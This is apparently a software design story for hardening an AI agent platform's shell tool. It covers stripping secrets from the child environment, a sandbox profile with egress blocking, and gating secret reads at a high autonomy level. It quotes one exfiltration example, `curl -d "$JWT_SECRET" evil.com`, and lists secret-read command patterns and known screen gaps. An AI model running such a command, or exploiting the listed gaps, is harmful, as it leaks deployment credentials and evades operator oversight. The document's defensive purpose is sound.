# Story 42-10: Shell Sandbox Profile and `secret.read` Enforcement

Status: drafted

Implements: Story 43-11 **Amendment 2, section D** (shell's level is a property of the executor) and **Amendment 4** ("Secret read is ONE action at 90"). Sits in Epic 42 because the deliverable is tool-executor hardening, not catalog policy.

## MANDATORY: Before You Code

**ALL contributors MUST read and follow the comprehensive development process:**

[BEFORE_YOU_CODE.md](../../../guides/BEFORE_YOU_CODE.md)

Then check the knowledge base: `.dev/spikes/`, `.dev/bugs/`, `.dev/findings/`, `.dev/decisions/`.

## User Story

As a **platform operator running agents that use the shell**,
I want the shell tool to stop handing the model the API process's secrets, an optional sandbox profile that earns the tool a lower autonomy level, and any read of a secret value into model context to be governed as one top-zone action,
So that `ls` is no longer priced like `curl -d "$JWT_SECRET" evil.com`, and a secret entering a model transcript is always a gated, audited decision.

## Priority

P0 for the env-strip (it is a live secret leak: any shell tool call can read the deployment's credentials today); P1 for the sandbox profile and the `secret.read` seams.

## Architectural Context (READ FIRST)

- **The verified hole (Amendment 2-D).** `ShellExecuteTool` runs an arbitrary `/bin/bash -c` string with the API process's **entire inherited environment** — the `ProcessStartInfo` built at `apps/tamma-elsa/src/Tamma.Activities/LlmCall/Tools/ShellExecuteTool.cs:86-94` sets `FileName`, `WorkingDirectory`, redirects — and **no `EnvironmentVariables`**, so the child sees `GITHUB_TOKEN`, `JWT_SECRET`, and the DB credentials. Protection is an 18-pattern **denylist** (`apps/tamma-elsa/src/Tamma.Activities/LlmCall/Tools/CommandValidator.cs:16-59`) — an allow/deny screen, not a level classifier. Amendment 4 names the consequence: `env` in a tool call is an **ungoverned `secret.read` today**.
- **The fix shape, per the amendment:**
  1. **Env allowlist, unconditional.** `psi.EnvironmentVariables` is cleared and repopulated from an explicit allowlist (`PATH`, `HOME`, `LANG`/locale, plus a configurable additive list). This is not part of the optional profile — inheriting the API's secrets is never correct. This closes the `env` leg of `secret.read` by construction.
  2. **A deployment sandbox profile, opt-in** (`Tools:Shell:Sandboxed`): egress blocked for the child (implementation may be network-namespace, proxy-only, or firewall-scoped per host — the profile declares the guarantee, the deployment provides the mechanism and the startup validator verifies it fail-loud), and CWD confinement (the existing `WorkingDirectory = _workspaceRoot` plus path validation so the command cannot operate outside the workspace).
  3. **The level is config-dependent because the risk is config-dependent**: unsandboxed shell stays **80** (it prices "arbitrary shell holding the deployment's secrets" — except it no longer holds them; it still holds unbounded egress and the governed-route curl bypass); the sandboxed profile earns **40**. The shipped `DefaultMinAutonomy` for `tool:shell_execute` and `effect:process.spawn` (same executor, same treatment) is computed **at startup from the profile** — the catalog is static per process, so this is a catalog-build input, not a runtime branch. Note the ladder composes by `max()`, so a platform assignment row cannot *lower* 80; the profile-dependent shipped level is the only clean mechanism.
  4. **`effect:secret.read` is minted here, level 90**, manage-secrets zone, enforceable, caller-kind LLM (43-13). It replaces the retired `effect:secret.reveal` **on the dial** — the reveal plumbing keeps its catalog row in the machinery inventory, its audit row and reveal-token expiry (`RevealSecret`, `apps/tamma-elsa/src/Tamma.Api/Endpoints/SecretEndpoints.cs:176`). One action, not the earlier two-key split.
- **What "enforced" honestly means for `secret.read`.** Reading a secret value **into model context** resolves to `effect:secret.read` at these seams:
  - **The reveal endpoint reached from a tool/LLM path**: an LLM-caller (43-13 predicate) request to the reveal route gates on `secret.read`, not on the machinery row.
  - **The env leg**: closed structurally by the allowlist (nothing to gate — the value is not there).
  - **The file leg** (cat of secret-bearing files) and shell-based reveals: **best-effort grading** in the tool loop (Seam B, `apps/tamma-elsa/src/Tamma.Api/Services/Agents/InlineToolLoopRunner.cs`) — commands matching secret-read shapes (`env`, `printenv`, reads of configured secret paths) resolve to `secret.read`. This is a denylist-strength screen and is **recorded as such**: the sandbox (env-strip + egress block) is the real control; the grading is defense in depth, with its gaps carried as known (same posture as `git_operations`' documented holes).
- **`agent-action:audit-secrets` stays at zone 10 ONLY as metadata** (names, ages, rotation state — Amendment 4). If the audit path ever reads values, it *is* `secret.read` at 90. Pinned by test.
- **Count pins**: +1 effect (`secret.read`) → this story moves the catalog totals by one (coordinate with 43-12's move; each story's pin edit names itself in the count test's history comment, per that test's convention — `ActionVocabularyCountTests.cs:132-149`). `secret.reveal` is **not** removed from the catalog (machinery inventory keeps it), so no −1.

## Acceptance Criteria

1. **The child environment is the allowlist, always.** A test runs `env` through `ShellExecuteTool` and asserts the output contains only allowlisted names — specifically not `Tamma:ApiToken`-derived vars, `GITHUB_TOKEN`, JWT or connection-string material. This AC holds in both profiles.
2. **The sandbox profile is declared, verified, and fail-loud**: with `Tools:Shell:Sandboxed=true`, startup verifies the egress guarantee and CWD confinement are actually in force (probe or config attestation per mechanism) and refuses to start otherwise. A test covers the refusal.
3. **The shipped level is profile-dependent**: catalog build assigns `tool:shell_execute` and `effect:process.spawn` `DefaultMinAutonomy = 40` when sandboxed, `80` when not. The 43-11 level-table pin test parameterizes these two rows on the profile; both arms are exercised in CI.
4. **CWD confinement holds under the sandboxed profile**: a command attempting to read or write outside the workspace root (absolute path, `..` traversal, `cd /`) fails with a validation error, pinned by test. Unsandboxed behavior is unchanged and pinned unchanged.
5. **`effect:secret.read` ships at 90**, enforceable, and the reveal route gates on it for LLM callers: an engine/LLM-caller reveal request below dial 90 without a grant is blocked (409 with the pending-authorization flow); a human caller is untouched (43-13). Both pinned.
6. **Shell secret-read grading fires**: `env`, `printenv`, and a read of a configured secret path each resolve to `secret.read` in the tool loop and gate at 90; the story's docs and the test comments state plainly that this screen is best-effort and the sandbox is the control. At least one documented gap (e.g. an indirect read) is listed as known-not-caught so nobody mistakes the screen for a guarantee.
7. **`audit-secrets` is pinned metadata-only**: a test asserts the audit path's data source excludes secret **values** (only names/metadata columns are readable by it); if the implementation ever joins to value storage, the test fails and the action's level question reopens per Amendment 4.
8. **`secret.reveal` is off the dial**: the descriptor is in the machinery inventory (no level semantics, 43-13), its audit row and token expiry unchanged — pinned by the machinery fixture test.
9. **Count pin moves by exactly +1** with a history line naming this story; `dotnet test` green in both profile arms.

## Dependencies

- **Story 43-13 (caller-kind predicate)** — AC5's human/LLM split on the reveal route and AC8's machinery fixture. Blocking for AC5/AC8; AC1–AC4 can land first.
- **Story 43-11** — the zone levels (80/40, 90) and the machinery inventory this story instantiates.
- **Story 43-14** — a `secret.read` ask should be coverable by a correlation grant like any 90-zone action; no code dependency, semantics inherited.
- **Story 29-1 (`ISecretStore`)** — landed; the reveal flow and secret-path configuration read through it.
- **Verified in tree**: `ShellExecuteTool.cs:86-94` (no `EnvironmentVariables`); `CommandValidator.cs:16-59`; `SecretEndpoints.cs:176`; `InlineToolLoopRunner.cs` (Seam B); `ActionVocabularyCountTests.cs:132-149`.

## Out of Scope

- Argument-level grading of shell into per-command levels — Amendment 2-D verified it is not implementable (no bounded verb set); the level stays per-executor-profile.
- The `git_operations` read/write holes (`log --output=FILE`, `branch -D`) — carried as known, owned by the 43-11 record.
- A container/jail runtime for tools — the profile declares guarantees; heavier isolation is its own epic.
- `secret.create` / `secret.rotate` / `secret.version.retire` keys (human admin routes) — proposed in 43-11's Missing actions, not minted here.

## Estimated Effort

3–4 days — 0.5 for the env allowlist, 1 for the profile + startup verification + CWD confinement, 1 for the profile-dependent level plumbing and test parameterization, 1 for `secret.read` minting, the reveal-route gate, grading, and pins.

## Change Log

| Date       | Version | Changes                                                                       | Author |
| ---------- | ------- | ------------------------------------------------------------------------------ | ------ |
| 2026-08-02 | 1.0.0   | Initial story — env allowlist, sandbox profile with profile-dependent level (40/80), secret.read minted at 90 and enforced, audit-secrets pinned metadata-only (43-11 Amendments 2-D and 4) | Claude |
